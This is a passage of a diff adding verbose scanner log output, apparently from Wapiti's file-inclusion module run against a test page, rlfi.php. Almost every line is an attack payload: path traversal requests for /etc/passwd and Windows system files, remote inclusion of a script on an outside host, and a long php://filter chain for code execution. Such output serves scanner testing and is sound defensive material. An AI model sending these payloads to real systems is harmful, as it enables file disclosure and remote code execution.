+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:55:53.731 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&security_level=2
+2024-03-20 16:55:53.739 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&security_level=2
+2024-03-20 16:55:53.746 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&security_level=2
+2024-03-20 16:55:53.754 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&security_level=2
+2024-03-20 16:55:53.760 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&security_level=2
+2024-03-20 16:55:53.767 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&security_level=2
+2024-03-20 16:55:53.774 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:55:53.782 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:55:53.790 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&security_level=2
+2024-03-20 16:55:53.796 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&security_level=2
+2024-03-20 16:55:53.803 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:55:53.810 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:55:53.816 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=file%3A%2F%2F%2Fetc%2Fpasswd&security_level=2
+2024-03-20 16:55:53.823 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&security_level=2
+2024-03-20 16:55:53.829 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd&security_level=2
+2024-03-20 16:55:53.835 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00&security_level=2
+2024-03-20 16:55:53.842 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices&security_level=2
+2024-03-20 16:55:53.849 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:55:53.857 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&security_level=2
+2024-03-20 16:55:53.865 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:55:53.871 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=rlfi.php&security_level=2
+2024-03-20 16:55:53.879 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=rlfi.php%00&security_level=2
+2024-03-20 16:55:53.885 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=rlfi.php%3A%3A%24DATA&security_level=2
+2024-03-20 16:55:53.895 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php
+2024-03-20 16:55:53.901 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00
+2024-03-20 16:55:53.909 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=%2Fetc%2Fpasswd
+2024-03-20 16:55:53.917 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=%2Fetc%2Fpasswd%00
+2024-03-20 16:55:53.926 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=%2Fetc%2Fservices
+2024-03-20 16:55:53.935 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=%2Fetc%2Fservices%00
+2024-03-20 16:55:53.943 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices
+2024-03-20 16:55:53.954 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00
+2024-03-20 16:55:53.963 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA
+2024-03-20 16:55:53.975 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:55:53.986 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:55:53.993 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA
+2024-03-20 16:55:54.002 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F
+2024-03-20 16:55:54.008 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F
+2024-03-20 16:55:54.014 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 16:55:54.022 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 16:55:54.029 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 16:55:54.036 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 16:55:54.043 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 16:55:54.050 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 16:55:54.058 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 16:55:54.064 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 16:55:54.072 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:55:54.079 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:55:54.087 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:55:54.093 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:55:54.100 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp
+2024-03-20 16:55:54.108 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 16:55:54.115 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 16:55:54.123 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 16:55:54.130 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 16:55:54.138 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 16:55:54.145 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 16:55:54.153 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 16:55:54.159 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 16:55:54.167 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:55:54.174 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:55:54.180 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:55:54.188 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:55:54.195 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 16:55:54.202 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 16:55:54.210 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 16:55:54.218 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 16:55:54.224 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 16:55:54.231 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 16:55:54.244 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 16:55:54.255 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 16:55:54.266 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:55:54.278 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:55:54.290 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:55:54.301 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:55:54.312 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=file%3A%2F%2F%2Fetc%2Fpasswd
+2024-03-20 16:55:54.324 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_security_level=submit&security_level=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices
+2024-03-20 16:55:54.335 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
